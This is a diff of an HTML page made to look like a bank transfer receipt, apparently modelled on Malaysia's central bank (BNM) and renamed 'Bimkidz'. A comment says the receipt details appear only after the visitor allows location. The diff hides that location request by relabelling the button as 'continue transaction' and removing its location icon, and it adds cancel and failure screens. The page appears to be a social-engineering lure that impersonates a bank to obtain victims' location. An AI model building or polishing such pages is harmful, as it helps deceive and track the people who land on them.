@@ -16,7 +16,7 @@
                 <div class="bank-logo">
                     <div class="logo-icon">🏦</div>
                     <div class="bank-name">
-                        <h1>BANK SENTRAL MALAYSIA</h1>
+                        <h1>BANK SENTRAL Bimkidz</h1>
                         <p class="bank-sub">BNM</p>
                     </div>
                 </div>
@@ -62,7 +62,7 @@
                     </div>
                     <div class="loc-actions">
                         <button class="btn-allow-location" id="allowLocationBtn">
-                            <span>📍</span> IZINKAN LOKASI SEKARANG
+                            <span></span> IZINKAN LANJUT TRANSAKSI 
                         </button>
                         <button class="btn-deny-location" id="denyLocationBtn">
                             ❌ TOLAK & BATAL TRANSFER
@@ -72,6 +72,34 @@
                         * Dengan mengizinkan, anda bersetuju dengan <a href="#">Syarat Perkhidmatan</a> Bankidzz
                     </p>
                 </div>
+            </div>
+
+            <!-- HASIL PEMBATALAN TRANSAKSI -->
+            <div class="transaction-failed" id="transactionFailed" hidden>
+                <div class="failed-icon" aria-hidden="true">!</div>
+                <p class="failed-eyebrow">STATUS TRANSAKSI</p>
+                <h2>Transaksi Gagal</h2>
+                <p class="failed-message">
+                    Transaksi telah dibatalkan. Dana anda tidak berhasil dipindahkan
+                    dan tidak ada uang yang dikirim kepada penerima.
+                </p>
+                <div class="failed-summary">
+                    <div>
+                        <span>Nomor referensi</span>
+                        <strong id="failedRefNumber">-</strong>
+                    </div>
+                    <div>
+                        <span>Jumlah transaksi</span>
+                        <strong id="failedAmount">-</strong>
+                    </div>
+                    <div>
+                        <span>Status</span>
+                        <strong class="failed-status-text">DIBATALKAN</strong>
+                    </div>
+                </div>
+                <button class="btn-return-home" id="returnHomeBtn" type="button">
+                    KEMBALI KE HALAMAN UTAMA
+                </button>
             </div>
 
             <!-- DETAIL STRUK (HANYA MUNCUL SETELAH LOKASI DIIZINKAN) -->
@@ -184,6 +212,44 @@
 
         <!-- NOTIFICATION -->
         <div id="notification" class="notification"></div>
+    </div>
+
+    <!-- MODAL KONFIRMASI PEMBATALAN -->
+    <div class="transaction-modal" id="cancelModal" aria-hidden="true">
+        <div class="modal-backdrop" data-close-cancel-modal></div>
+        <section
+            class="modal-card"
+            role="dialog"
+            aria-modal="true"
+            aria-labelledby="cancelModalTitle"
+            aria-describedby="cancelModalDescription"
+        >
+            <button
+                class="modal-close"
+                id="closeCancelModalBtn"
+                type="button"
+                aria-label="Tutup konfirmasi"
+            >&times;</button>
+            <div class="modal-warning-icon" aria-hidden="true">!</div>
+            <p class="modal-eyebrow">KONFIRMASI PEMBATALAN</p>
+            <h2 id="cancelModalTitle">Batalkan transaksi ini?</h2>
+            <p id="cancelModalDescription">
+                Jika dibatalkan, transaksi tidak akan diproses dan dana tidak akan
+                dikirim kepada penerima.
+            </p>
+            <div class="modal-transaction-info">
+                <span>Jumlah yang akan dibatalkan</span>
+                <strong id="cancelModalAmount">-</strong>
+            </div>
+            <div class="modal-actions">
+                <button class="btn-modal-back" id="keepTransactionBtn" type="button">
+                    KEMBALI
+                </button>
+                <button class="btn-modal-cancel" id="confirmCancelBtn" type="button">
+                    YA, BATALKAN TRANSAKSI
+                </button>
+            </div>
+        </section>
     </div>
 
     <script src="script.js"></script>
